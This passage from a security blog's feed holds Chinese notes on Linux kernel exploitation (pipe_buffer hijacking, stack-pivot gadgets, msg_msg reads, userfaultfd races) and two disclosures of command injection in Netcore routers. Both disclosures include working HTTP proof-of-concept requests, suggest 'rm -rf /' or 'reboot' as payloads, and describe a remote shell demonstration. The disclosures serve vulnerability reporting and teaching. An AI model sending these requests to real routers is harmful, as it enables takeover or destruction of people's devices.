class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment"> * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment"> * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment"> * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment"> * cache.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="泄露内核基地址-1"><a href="#泄露内核基地址-1" class="headerlink" title="泄露内核基地址"></a>泄露内核基地址</h5><p><code>pipe_buffer-&gt;pipe_buf_operations</code>指向全局函数表</p><h5 id="劫持程序执行流"><a href="#劫持程序执行流" class="headerlink" title="劫持程序执行流"></a>劫持程序执行流</h5><p>当我们利用 <code>close(pipe_fd[1]);close(pipe_fd[0]);</code>关闭管道两端时，会触发 <code>pipe_buffer-&gt;pipe_bufer_operations-&gt;release</code> 指针，因此可以覆写pipe_buf_operations函数表中的release指针或劫持函数表到可控区域，便可劫持程序执行流。其 <code>rdi</code>和 <code>rsi</code>均可控，<code>rdi</code>为 <code>struct pipe_inode_info</code>，<code>rsi</code>为 <code>struct pipe_buffer</code>。</p><p>调试时在 <code>pipe_buf_release</code>处下断点。</p><p>一个栈迁移的JOP gadget（不知道怎么搜这种类型的gadget)，实现效果是</p><p>RDX！&#x3D;RCX时PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET可以用于此处栈迁移</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exploooosion @ Exploooosion in ~/mypwn/linux_kernel/Digging-into-Kernel-3/core workenv [15:24:16] </span></span><br><span class="line">$ objdump -D --start-address=0xffffffff81250c9d --stop-address=0xffffffff81250cbf ../vmlinux</span><br><span class="line"></span><br><span class="line">../vmlinux：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">ffffffff81250c9d &lt;simple_write_begin+0x12d&gt;:</span><br><span class="line">ffffffff81250c9d:56                   push   %rsi</span><br><span class="line">ffffffff81250c9e:5c                   pop    %rsp</span><br><span class="line">ffffffff81250c9f:48 39 d1             cmp    %rdx,%rcx</span><br><span class="line">ffffffff81250ca2:72 e1                jb     ffffffff81250c85 &lt;simple_write_begin+0x115&gt;</span><br><span class="line">ffffffff81250ca4:5b                   pop    %rbx</span><br><span class="line">ffffffff81250ca5:31 c0                xor    %eax,%eax</span><br><span class="line">ffffffff81250ca7:5d                   pop    %rbp</span><br><span class="line">ffffffff81250ca8:41 5c                pop    %r12</span><br><span class="line">ffffffff81250caa:e9 91 25 db 00       jmp    ffffffff82003240 &lt;__x86_return_thunk&gt;</span><br><span class="line">ffffffff81250caf:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)</span><br><span class="line">ffffffff81250cb4:0f b6 4e 51          movzbl 0x51(%rsi),%ecx</span><br><span class="line">ffffffff81250cb8:b8 00 10 00 00       mov    <span class="variable">$0x1000</span>,%eax</span><br><span class="line">ffffffff81250cbd:48 d3              shl    %cl,%rax</span><br><span class="line">(workenv) </span><br><span class="line"><span class="comment"># exploooosion @ Exploooosion in ~/mypwn/linux_kernel/Digging-into-Kernel-3/core workenv [15:27:03] </span></span><br><span class="line">$ objdump -D --start-address=0xffffffff82003240 --stop-address=0xffffffff82003250 ../vmlinux</span><br><span class="line"></span><br><span class="line">../vmlinux：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">ffffffff82003240 &lt;__x86_return_thunk&gt;:</span><br><span class="line">ffffffff82003240:c3                   ret</span><br><span class="line">ffffffff82003241:cc                   int3</span><br><span class="line">ffffffff82003242:0f ae e8             lfence</span><br><span class="line">ffffffff82003245:eb f9                jmp    ffffffff82003240 &lt;__x86_return_thunk&gt;</span><br><span class="line">ffffffff82003247:cc                   int3</span><br><span class="line">(workenv) </span><br></pre></td></tr></table></figure><p>ps：可以通过pwntools寻找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;vmlinux&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> elf.search(asm(<span class="string">&#x27;push rsi; pop rsp;&#x27;</span>), executable = <span class="literal">True</span>):</span><br><span class="line">    <span class="built_in">print</span> elf.disasm(address = x, n_bytes = <span class="number">0x40</span>)</span><br><span class="line">    <span class="built_in">print</span></span><br></pre></td></tr></table></figure><h3 id="System-V-消息队列"><a href="#System-V-消息队列" class="headerlink" title="System V 消息队列"></a>System V 消息队列</h3><p>在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：</p><ul><li>msgget：创建一个消息队列</li><li>msgsnd：向指定消息队列发送消息</li><li>msgrcv：从指定消息队列接接收消息</li></ul><p>当我们创建一个消息队列时，在内核空间中会创建一个 <code>msg_queue</code> 结构体，其表示一个消息队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">    <span class="type">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line">    <span class="type">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line">    <span class="type">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h4 id="msg-msg-kmalloc-any-GFP-KERNEL-ACCOUNT"><a href="#msg-msg-kmalloc-any-GFP-KERNEL-ACCOUNT" class="headerlink" title="msg_msg (kmalloc-any | GFP_KERNEL_ACCOUNT)"></a>msg_msg (kmalloc-any | GFP_KERNEL_ACCOUNT)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>  <span class="title">m_list</span>;</span>   <span class="comment">// 只有一条消息时，指向msg_queue的q_messages            /*     0  0x10 */  </span></span><br><span class="line"><span class="type">long</span> <span class="type">int</span>      m_type;   <span class="comment">/* message text size */</span>         <span class="comment">/*  0x10   0x8 */</span></span><br><span class="line"><span class="type">size_t</span>         m_ts;                 <span class="comment">/*  0x18   0x8 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *        <span class="title">next</span>;</span>                 <span class="comment">/*  0x20   0x8 */</span></span><br><span class="line"><span class="type">void</span> *                     security;             <span class="comment">/*  0x28   0x8 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size: 48, cachelines: 1, members: 5 */</span></span><br><span class="line"><span class="comment">/* last cacheline: 48 bytes */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>* <span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>* <span class="title">prev</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>msg_queue</code> 和 <code>msg_msg</code> 构成双向链表</p><p><img src="/image/learning_linux_kernel_2/1760710744145.png" alt="1760710744145"></p><p><code>msg_queue</code> 的大小基本上是固定的，但是 <code>msg_msg</code> 作为承载消息的本体<strong>其大小是可以随着消息大小的改变而进行变动的</strong></p><p>当我们单次发送 <strong>大于【一个页面大小 - header size】</strong> 大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体，其与 <code>msg_msg</code> 之间形成如下单向链表结构：单个 <code>msg_msgseg</code> 的大小最大为一个页面大小</p><p><img src="/image/learning_linux_kernel_2/1760710836562.png" alt="1760710836562"></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h4 id="越界数据读取"><a href="#越界数据读取" class="headerlink" title="越界数据读取"></a>越界数据读取</h4><p>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，我们不难想到的是：若是我们能够控制一个 <code>msg_msg</code> 的 header，将其 <code>m_ts</code> 成员改为一个较大的数，我们就能够<strong>越界读取出最多将近一张内存页大小的数据</strong></p><h3 id="条件竞争（Race-condition）"><a href="#条件竞争（Race-condition）" class="headerlink" title="条件竞争（Race condition）"></a>条件竞争（Race condition）</h3><h4 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h4><p>满足以下可能情况：</p><ul><li>不直接将用户空间的数据传入内核空间，只传入指针</li><li>后续操作会不止一次使用到该指针</li></ul><p>比如第一次使用指针校验用户空间的数据信息。先开辟一个线程不断地改写指针指向的数据信息，当前线程不断将数据信息合法化，形成竞争，总会存在经校验后的信息在使用时总会不合法的情况。</p><h4 id="userfaultfd系统调用（linux-5-11及以后不能使用）"><a href="#userfaultfd系统调用（linux-5-11及以后不能使用）" class="headerlink" title="userfaultfd系统调用（linux-5.11及以后不能使用）"></a>userfaultfd系统调用（linux-5.11及以后不能使用）</h4><p>大致功能：</p><ul><li>利用 <code>mmap</code>函数分配一块匿名内存（没有实际物理内存页）并注册为 <code>userfaultfd</code>。</li><li>当某线程访问该内存（或进行数据交换）时会触发缺页异常，从而将控制权交给userfaultfd 的 uffd monitor 线程。</li><li>利用 <code>uffd monitor</code> 线程实现一些恶意操作，例如 <code>sleep</code>在那里造成UAF、<code>double fetch</code>将某线程的数据覆写、或对某线程读写的内核对象释放掉后再分配到我们想要的地方。</li></ul><p>在较新版本的内核中修改了变量 <code>sysctl_unprivileged_userfaultfd</code> 的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int sysctl_unprivileged_userfaultfd __read_mostly;</span><br><span class="line">//...</span><br><span class="line">SYSCALL_DEFINE1(userfaultfd, int, flags)</span><br><span class="line">&#123;</span><br><span class="line">    struct userfaultfd_ctx *ctx;</span><br><span class="line">    int fd;</span><br><span class="line"></span><br><span class="line">    if (!sysctl_unprivileged_userfaultfd &amp;&amp;</span><br><span class="line">        (flags &amp; UFFD_USER_MODE_ONLY) == 0 &amp;&amp;</span><br><span class="line">        !capable(CAP_SYS_PTRACE)) &#123;</span><br><span class="line">        printk_once(KERN_WARNING &quot;uffd: Set unprivileged_userfaultfd &quot;</span><br><span class="line">            &quot;sysctl knob to 1 if kernel faults must be handled &quot;</span><br><span class="line">            &quot;without obtaining CAP_SYS_PTRACE capability\n&quot;);</span><br><span class="line">        return -EPERM;</span><br><span class="line">    &#125;</span><br><span class="line">//...</span><br></pre></td></tr></table></figure><p>之前的版本当中 <code>sysctl_unprivileged_userfaultfd</code> 这一变量被初始化为 <code>1</code>，而在较新版本的内核当中这一变量并没有被赋予初始值，<strong>编译器会将其放在 bss 段，默认值为 0</strong>，意味着只 <code>root</code>用户才能使用 <code>userfaultfd</code></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-5145</title>
      <link href="/2025/05/08/2025-05-8-CVE-2025-5145/"/>
      <url>/2025/05/08/2025-05-8-CVE-2025-5145/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Unauthorized-Command-Injection-Vulnerability-in-Multiple-Router-and-Wireless-AP-Products-of-Netcore"><a href="#Unauthorized-Command-Injection-Vulnerability-in-Multiple-Router-and-Wireless-AP-Products-of-Netcore" class="headerlink" title="Unauthorized Command Injection Vulnerability in Multiple Router and Wireless AP Products of Netcore"></a>Unauthorized Command Injection Vulnerability in Multiple Router and Wireless AP Products of Netcore</h1><h2 id="I-Involved-Products-and-Firmware-Download-Addresses"><a href="#I-Involved-Products-and-Firmware-Download-Addresses" class="headerlink" title="I. Involved Products and Firmware Download Addresses"></a>I. Involved Products and Firmware Download Addresses</h2><p>NBR1005GPEV2：<a href="https://www.netcoretec.com/service-support/download/firmware/2707.html">https://www.netcoretec.com/service-support/download/firmware/2707.html</a></p><p>B6V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2703.html">https://www.netcoretec.com/service-support/download/firmware/2703.html</a></p><p>COVER5：<a href="https://www.netcoretec.com/service-support/download/firmware/2680.html">https://www.netcoretec.com/service-support/download/firmware/2680.html</a></p><p>NAP930：<a href="https://www.netcoretec.com/service-support/download/firmware/2704.html">https://www.netcoretec.com/service-support/download/firmware/2704.html</a></p><p>NAP830：<a href="https://www.netcoretec.com/service-support/download/firmware/2708.html">https://www.netcoretec.com/service-support/download/firmware/2708.html</a></p><p>NBR100V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2706.html">https://www.netcoretec.com/service-support/download/firmware/2706.html</a></p><p>NBR200V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2705.html">https://www.netcoretec.com/service-support/download/firmware/2705.html</a></p><p>POWER13：<a href="https://www.netcoretec.com/service-support/download/firmware/2700.html">https://www.netcoretec.com/service-support/download/firmware/2700.html</a></p><h2 id="II-Cause-of-the-Vulnerability"><a href="#II-Cause-of-the-Vulnerability" class="headerlink" title="II. Cause of the Vulnerability"></a>II. Cause of the Vulnerability</h2><p>Under the file system directory <code>/www/cgi-bin/</code>, there are shell script files such as <code> acbackup</code>, <code>backup</code>, <code>upgrade</code>, <code>ac_upgrade</code>, and <code>upgradeAP</code>. These scripts will first process the request fields using the urldecode function, then split the param by <code>&amp;</code>, and then separate the <code>key</code>and <code>val </code>by <code>=</code>. Finally, this command  <code>eval &quot;${key}=&#39;${val}&#39;&quot;</code>is executed.Obviously, the <code>key</code> is not wrapped in single quotes (<code>&#39;</code>), and <code>eval</code> will perform a secondary parsing of the expanded string. If the <code>key</code> is an executable command, <code>eval</code> will directly execute that command.</p><p><img src="/image/CVE-2025-5145/1746586581734.png" alt="1746586581734"></p><p>This vulnerability exists in the Query String parsing logic of the router’s Web management interface. Attackers can construct malicious URL parameters to bypass the filtering of most metacharacters by urldecode and only use the <strong>newline character</strong> as the command delimiter. This function filters a variety of metacharacters, parses <code>%XX</code> in the URL to <code>\xXX</code> and then to the real character, and replaces the + character with a space.</p><p><img src="/image/CVE-2025-5145/1746586587320.png" alt="1746586587320"></p><p>In <code>/usr/sbin/uhttpd</code>, by combining the source code found online and the decompiled code, when the client initiates an HTTP request prefixed with <code>/cgi‑bin/</code>, uHTTPd will transfer the request to the corresponding CGI program. It will first call clearenv() in the child process and set environment variables such as REQUEST_METHOD, QUERY_STRING, CONTENT_LENGTH, and SCRIPT_NAME according to the CGI specification. Finally, it calls the script itself through execl(), and the script uses the environment variables to receive the request parameters.</p><p><img src="/image/CVE-2025-5145/1746516698127.png" alt="1746516698127"></p><h2 id="III-Explanation-of-the-POC"><a href="#III-Explanation-of-the-POC" class="headerlink" title="III. Explanation of the POC"></a>III. Explanation of the POC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/acbackup?mkdir+/tmp/test1+%0Afoo=bar&amp;mac=123 HTTP/1.1</span><br><span class="line">Host: 192.168.50.2</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 128</span><br><span class="line">Origin: http://192.168.50.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://192.168.50.2/login.html&#123;&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;id&quot;: 1, &quot;method&quot;: &quot;call&quot;, &quot;params&quot;: [ &quot;00000000000000000000000000000000&quot;, &quot;routerd&quot;, &quot;login_name_get&quot;,&#123;&#125; ] &#125;</span><br></pre></td></tr></table></figure><p>The request content can be arbitrary. Scripts like acbackup will parse the Query String, and commands such as <code> mkdir+/tmp/test1</code> can be replaced with commands like <code> reboot</code>, <code>rm+-rf+/+</code> and other commands to cause damage to the router.</p><h2 id="IV-Demonstration-Video"><a href="#IV-Demonstration-Video" class="headerlink" title="IV. Demonstration Video"></a>IV. Demonstration Video</h2><p>The video demonstrates the vulnerability demonstration taking NBR1005GPEV2 as an example. The injected commands are <code>mkdir /tmp/test1</code>, <code>mkdir /tmp/test2</code>, <code>reboot</code> (with a delay), <code>rm -rf /</code>, and the code <code>echo &quot;$key&quot; &gt; /dev/console</code> is added in acbackup to more intuitively see the string when the parameter query_string is assigned to the key after a series of parsing processes.</p><h2 id="V-Repair-Suggestions"><a href="#V-Repair-Suggestions" class="headerlink" title="V. Repair Suggestions"></a>V. Repair Suggestions</h2><p>Change the vulnerable execution statement <code>eval &quot;${key}=&#39;${val}&#39;&quot;</code> in the corresponding script to <code>eval &quot;&#39;${key}&#39;=&#39;${val}&#39;&quot;</code>, and add the filtering of CRLF in urldecode.</p><p><strong>Discoverer: Exploo0Osion.<br>Please contact Netcore (Netis Technology) technical support to fix this vulnerability in a timely manner.</strong></p>]]></content>
      
      
      <categories>
          
          <category> router </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2025-5146</title>
      <link href="/2025/05/08/2025-05-8-CVE-2025-5146/"/>
      <url>/2025/05/08/2025-05-8-CVE-2025-5146/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Arbitrary-Command-Injection-Vulnerability-in-Netcore-Routers-and-Wireless-APs-After-Authorization"><a href="#Arbitrary-Command-Injection-Vulnerability-in-Netcore-Routers-and-Wireless-APs-After-Authorization" class="headerlink" title="Arbitrary Command Injection Vulnerability in Netcore Routers and Wireless APs After Authorization"></a>Arbitrary Command Injection Vulnerability in Netcore Routers and Wireless APs After Authorization</h1><h2 id="I-Affected-Products-and-Firmware-Download-Links"><a href="#I-Affected-Products-and-Firmware-Download-Links" class="headerlink" title="I. Affected Products and Firmware Download Links"></a>I. Affected Products and Firmware Download Links</h2><p>NBR1005GPEV2：<a href="https://www.netcoretec.com/service-support/download/firmware/2707.html">https://www.netcoretec.com/service-support/download/firmware/2707.html</a></p><p>B6V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2703.html">https://www.netcoretec.com/service-support/download/firmware/2703.html</a></p><p>COVER5：<a href="https://www.netcoretec.com/service-support/download/firmware/2680.html">https://www.netcoretec.com/service-support/download/firmware/2680.html</a></p><p>NAP930：<a href="https://www.netcoretec.com/service-support/download/firmware/2704.html">https://www.netcoretec.com/service-support/download/firmware/2704.html</a></p><p>NAP830：<a href="https://www.netcoretec.com/service-support/download/firmware/2708.html">https://www.netcoretec.com/service-support/download/firmware/2708.html</a></p><p>NBR100V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2706.html">https://www.netcoretec.com/service-support/download/firmware/2706.html</a></p><p>NBR200V2：<a href="https://www.netcoretec.com/service-support/download/firmware/2705.html">https://www.netcoretec.com/service-support/download/firmware/2705.html</a></p><h2 id="II-Vulnerability-Causes"><a href="#II-Vulnerability-Causes" class="headerlink" title="II. Vulnerability Causes"></a>II. Vulnerability Causes</h2><p>The firmware of these routers uses the <code>uhttpd</code> + <code>ubus</code> architecture.</p><p><strong>uhttpd (Web Server)</strong></p><ul><li>Listens on port <code>80</code> (HTTP) and accepts <code>POST /ubus</code> requests.</li><li>Parses the request header to confirm the <code>Content-Type</code> is <code>application/x-www-form-urlencoded</code>, but the actual payload is JSON (non-standard but common).</li><li>Forwards requests to the <code>ubus</code> RPC service (typically via <code>ubus</code> Unix Socket or CGI interface).</li></ul><p>Running the <code>ubus list</code> command shows registered ubus services</p><p><img src="/image/CVE-2025-5146/1746600757491.png" alt="1746600757491"></p><p>The vulnerability is found in <code>routerd</code> (file: <code>/usr/bin/routerd</code>). In its data segment, the callback function for the <code>passwd_set</code> method is <code>sub_416260</code></p><p><img src="/image/CVE-2025-5146/1746600953768.png" alt="1746600953768"></p><p>In <code>sub_416260</code>, <code>blobmsg_parse</code> parses Blob format data (OpenWrt’s binary JSON format, see image:</p><p><img src="/image/CVE-2025-5146/1746601012709.png" alt="1746601012709"></p><p>The structure mapping is:</p><ul><li><code>v19</code> → <code>user</code> (username)</li><li><code>v20</code> → <code>pwd</code> (password), with <code>v16 = v20</code></li><li><code>v21</code> → <code>by</code> (empty if not provided in the request)</li></ul><p><img src="/image/CVE-2025-5146/1746601107563.png" alt="1746601107563"></p><p>The username from <code>v19</code> is extracted, skipping the Blobmsg header. Each character is checked to ensure it is <code>_</code> (ASCII <code>0x5F</code>) or alphanumeric (via <code>isalnum</code>). Illegal characters trigger an error log</p><p><img src="/image/CVE-2025-5146/1746601255662.png" alt="1746601255662"></p><p>The password from <code>v16</code> (stored as <code>v17</code>, skipping the Blobmsg header) is passed to <code>passwd_set_api</code>  <strong>without any validation</strong> . This function executes <code>passwd_set_api(username, password)</code>.</p><p>If the result is <code>0</code> (success), and the username is “root” with <code>v15</code> (value of the <code>by</code> field) not equal to “ac”, the code writes <code>v17</code> to:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uci <span class="built_in">set</span> auto_ac.auto_ac.passwd=%s; uci commit auto_ac</span><br></pre></td></tr></table></figure><p>and calls <code>system()</code> with this command, creating a <strong>command injection vulnerability</strong></p><p><img src="/image/CVE-2025-5146/1746601374783.png" alt="1746601374783"></p><p>In <code>passwd_set_api</code>, the password (<code>a2</code>) is not validated</p><p><img src="/image/CVE-2025-5146/1746601489477.png" alt="1746601489477"></p><p>If a password exists, it constructs commands:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(v10, <span class="number">0x80u</span>, <span class="string">&quot;passwd %s&quot;</span>, a1);  <span class="comment">// e.g., &quot;passwd root&quot;</span></span><br><span class="line"><span class="built_in">snprintf</span>(v11, <span class="number">0x80u</span>, <span class="string">&quot;%s\n&quot;</span>, a2);       <span class="comment">// e.g., &quot;admin123\n&quot;</span></span><br><span class="line">v4 = popen(v10, <span class="string">&quot;w&quot;</span>);                   <span class="comment">// Opens a command pipe for writing</span></span><br><span class="line">fwrite(v11, ...);                        <span class="comment">// Writes the password twice (for confirmation)</span></span><br></pre></td></tr></table></figure><p>On success, it returns <code>0</code>, leading to the command injection vulnerability</p><p><img src="/image/CVE-2025-5146/1746601700013.png" alt="1746601700013"></p><h2 id="III-POC-Explanation"><a href="#III-POC-Explanation" class="headerlink" title="III. POC Explanation"></a>III. POC Explanation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /ubus HTTP/1.1</span><br><span class="line">Host: 192.168.50.2</span><br><span class="line">Content-Length: 163</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Accept: application/json, text/javascript, /; q=0.01</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">Origin: http://192.168.50.2</span><br><span class="line">Referer: http://192.168.50.2/guide/guide.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:22,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;a9c61fc83080b13ded7512db83c9b123&quot;,&quot;routerd&quot;,&quot;passwd_set&quot;,&#123;&quot;user&quot;:&quot;root&quot;,&quot;pwd&quot;:&quot;admin123;mkdir -p /tmp/test1&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure><ul><li>Replace the <code>sid</code> in the <code>params</code> field (first value, e.g., <code>&quot;a9c61fc83080b13ded7512db83c9b123&quot;</code>) with the actual session ID obtained after login.</li><li>The command <code>mkdir -p /tmp/test1</code> can be replaced with any arbitrary command.</li></ul><p>Demonstration of remote shell access:</p><p><img src="/image/CVE-2025-5146/1746603016270.png" alt="1746603016270"></p><h2 id="IV-Recommended-Solution"><a href="#IV-Recommended-Solution" class="headerlink" title="IV. Recommended Solution"></a>IV. Recommended Solution</h2><p>Apply the same validation used for the username to the password: restrict it to contain only underscores, letters, and numbers.</p><p><strong>Discoverer: Exploo0Osion.</strong></p><p><strong>Please contact Netcore (Netis Technology) technical support to fix this vulnerability in a timely manner.</strong></p>]]></content>
      
      
      <categories>
          
          <category> router </category>
          
      </categories>
      
      
    </entry>
    
    
    
